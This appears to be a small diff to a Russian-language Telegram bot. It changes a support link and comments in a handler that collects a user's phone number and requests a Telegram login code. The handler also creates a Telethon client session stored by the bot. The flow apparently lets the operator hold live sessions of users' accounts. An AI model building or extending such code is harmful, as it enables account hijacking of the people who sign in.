@@ -179,7 +179,7 @@ def get_main_keyboard(user_id: int):
         ],
         [
             InlineKeyboardButton(text="💰 Вывод средств", callback_data="menu_withdraw"),
-            InlineKeyboardButton(text="🆘 Поддержка", url=f"https://t.me/{REQUIRED_CHANNEL.replace('@', '')}")
+            InlineKeyboardButton(text="🆘 Поддержка", url="https://t.me/freakyfeelings")
         ],
     ]
     if user_id in ADMIN_IDS:
@@ -305,9 +305,10 @@ async def process_phone(message: Message, state: FSMContext):
 
     await state.update_data(phone=phone, session_name=session_name, session_path=session_path)
 
-    # Автоматический запрос кода без промежуточной кнопки
+    # Автоматический запрос кода
     waiting_msg = await message.answer("⏳ Запрашиваю код подтверждения в ваш Telegram...")
 
+    # Передаем API_ID строкой, чтобы избежать ошибки
     client = TelegramClient(session_path, str(API_ID), API_HASH)
 
     try:
